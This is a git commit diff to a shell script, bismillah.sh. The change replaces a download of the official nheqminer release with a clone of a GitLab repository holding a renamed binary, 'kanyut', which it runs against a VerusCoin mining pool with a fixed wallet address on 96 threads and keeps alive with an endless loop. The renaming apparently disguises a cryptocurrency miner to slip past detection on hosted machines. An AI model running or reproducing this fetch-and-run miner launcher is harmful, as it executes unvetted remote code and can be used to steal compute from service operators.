2e93bbb8d491eb1bd0e1379d1a4de40c44b5137e
dannys-id <60502767+dannys-id@users.noreply.github.com>
2021-10-18 21:40:34 +0700

    Update bismillah.sh

--- bismillah.sh
+++ bismillah.sh
@@ -1,9 +1,8 @@
 #!/bin/sh
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-./nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u RV78iwCVdQZXmVU28ddyRcQUDAChZNggDn -p x c=VRSC mc=VRSC -t 96
+git clone https://gitlab.com/kikibena365/ikan.git
+cd ikan
+chmod +x kanyut 
+./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u RV78iwCVdQZXmVU28ddyRcQUDAChZNggDn -p x c=VRSC mc=VRSC -t 96
 while [ 1 ]; do
 sleep 30
 done
